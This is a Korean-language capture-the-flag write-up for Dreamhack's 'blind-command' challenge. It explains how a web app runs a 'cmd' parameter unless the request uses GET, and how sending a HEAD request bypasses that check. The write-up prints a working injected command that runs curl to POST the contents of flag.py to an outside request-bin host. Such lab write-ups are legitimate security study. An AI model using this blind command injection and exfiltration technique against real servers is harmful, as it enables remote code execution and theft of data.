# blind-command

* 문제 Description
  * Read the flag file XD

# 문제 분석 및 해결
* 분석
  * 접속 페이지에 대한 분석
    * 접속 정보에 들어가면 특별한게 나오지는 않음
      * button이나 tab등 UI기능이 따로 있지는 않음
    * ?cmd=[cmd] 라고 나옴
      * cmd에 대한 정보를 parameter로 넘기는거로 보임
  * source code 분석
    * parameter로 받아온 cmd값을 기준으로 분기 logic이 있음
      * cmd = request.args.get('cmd', '')
      * cmd 값이 없는 경우
        * return "?cmd=[cmd]"
      * method가 get으로 들어온 경우
        * return ""
      * 이외의 경우에 cmd 명령어 수행

* 해결
  * GET Method를 쓰지 못하면 post로만 해야되나 라고 먼저 생각을 했음
    * 이번에 알게된 정보
      * HTTP Method로 OPTIONS를 사용하여 request를 보내면 해당 url에서 사용 가능한 정보들이 response의 header에 담겨져 온다.
      * HEAD Method는 GET과 동일한 결과값을 반환받는 Method이지만, \
        response의 body는 담겨있지 않고, header결과값만 반환받는다.
      * request bin은 특정 url로 들어오는 request의 내용을 편리하게 확인할 수 있도록 제공하는 것 
  * 위의 문제에서 사용하게 되면
    * allow -> HEAD, OPTIONS, GET
  * 결국 OPTIONS는 사용법 찾을때만 사용할 수 있고, GET은 server 내부 logic에서 걸러지게 됨
    * 사실 근본적으로는 GET, POST, HEAD등 HTTP Method를 사용하여 request를 보내게 되면, \
      OPTIONS request를 server로 먼저 보내서 client가 요청한 request가 server에서 allow하는 확인 작업을 거치게 됨
  * HEAD Method를 사용하기로 함
    * 우리가 HEAD Method를 사용하게 되면, cmd명령어로 수행되는 결과물을 client로 바로 return 받는것이 아니라, \
      client가 아닌 다른 client에서 결과값을 확인해야 함
    * dreamhack에서 제공하는 request bin을 이용하여 결과값을 확인해야 함
  * HEAD Method를 사용하기 위해 postman을 이용하여 request를 보내기로 함
  * postman(HEAD request server로 전달) -> server에서 flag값을 찾아서 request bin으로 request를 보냄 -> request bin에서 request 내용을 확인 
  * postman에서 요청한 request uri 
    * http://host3.dreamhack.games:24399/?cmd=curl%20-X%20POST%20-d%20%22$(cat%20flag.py)%22%20%22https://efexbri.request.dreamhack.games%22
    * {server 주소}/?cmd={server에서 실행할 명령어}
    * server에서 실행할 명령어 상세
      * curl -X POST -d "$(cat flag.py)" "https://efexbri.request.dreamhack.games"
        * curl -> server http request 명령어
        * -X {Method} -> request HTTP Method 명시
        * -d {data} -> POST 내부 data
          * 위에서는 server cmd창에서 실행한 cat flag.py의 결과 string을 body에 담도록 함
        * "url" -> request를 보낼 주소
          * dreamhack에서 제공하는 request bin의 주소를 사용함